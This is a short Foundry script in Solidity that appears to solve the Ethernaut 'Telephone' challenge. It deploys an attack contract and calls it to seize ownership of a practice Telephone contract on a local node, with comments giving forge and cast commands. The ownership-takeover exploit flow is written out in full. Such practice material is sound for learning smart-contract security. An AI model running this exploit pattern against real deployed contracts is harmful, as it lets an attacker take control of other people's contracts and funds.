// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/TelephoneHack.sol";
import "../src/Telephone.sol";

//forge script script/TelephoneHack.s.sol:TelephoneHackScript --rpc-url http://localhost:8545 --broadcast -vvvv
//cast call --rpc-url http://localhost:8545 0x0e8D9dE2474469bd6396dde1530A92c86bAD13Cf "owner()" | xargs cast --abi-decode "a()(address)"
contract TelephoneHackScript is Script {
  function setUp() public {}

  function run() public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    address attackerAddress = vm.envAddress("ATTACKER_ADDRESS");

    vm.startBroadcast(attackerPrivateKey);
    Telephone telephoneContract = Telephone(address(0x0e8D9dE2474469bd6396dde1530A92c86bAD13Cf));

    telephoneContract.owner();

    TelephoneHack telephoneHackContract = new TelephoneHack(address(telephoneContract));

    telephoneHackContract.callTelephone(attackerAddress);

    telephoneContract.owner();
    vm.stopBroadcast();

  }
}